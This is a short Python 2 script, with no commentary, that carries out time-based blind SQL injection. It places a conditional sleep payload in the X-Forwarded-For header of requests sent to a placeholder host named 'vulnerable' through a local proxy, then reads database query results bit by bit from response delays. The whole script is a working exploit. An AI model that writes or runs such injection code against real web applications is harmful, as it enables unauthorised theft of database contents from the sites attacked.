import requests
from sys import argv
import time

def test(payload):
	headers={
		"X-Forwarded-For":"hacker' or if(("+payload+"),sleep(0.5),0) and '1'='1"
	}
	proxy={
		'http':'127.0.0.1:8080'
	}


	start=time.time()
	res=requests.get("http://vulnerable",headers=headers,proxies=proxy)
	if time.time()-start > 0.5:
		return 1
	else:
		return 0	



payload=argv[1]



ind =1
while ind<10:
	value=1
	index=0
	output=""
	pl=payload + " limit "+str(ind)+",1"
	print pl
	while value!=0:
		value=0
		
		index+=1
		for i in xrange(0,7):
			if test("select ascii(substring(("+pl+"),"+str(index)+",1))& "+str(2**i)):
				#print "select ascii(substring(("+payload+"),"+str(index)+",1))& "+str(2**i)
				value+=2**i
				print 0
		output+=str(chr(value))
		print output
		
	ind+=1


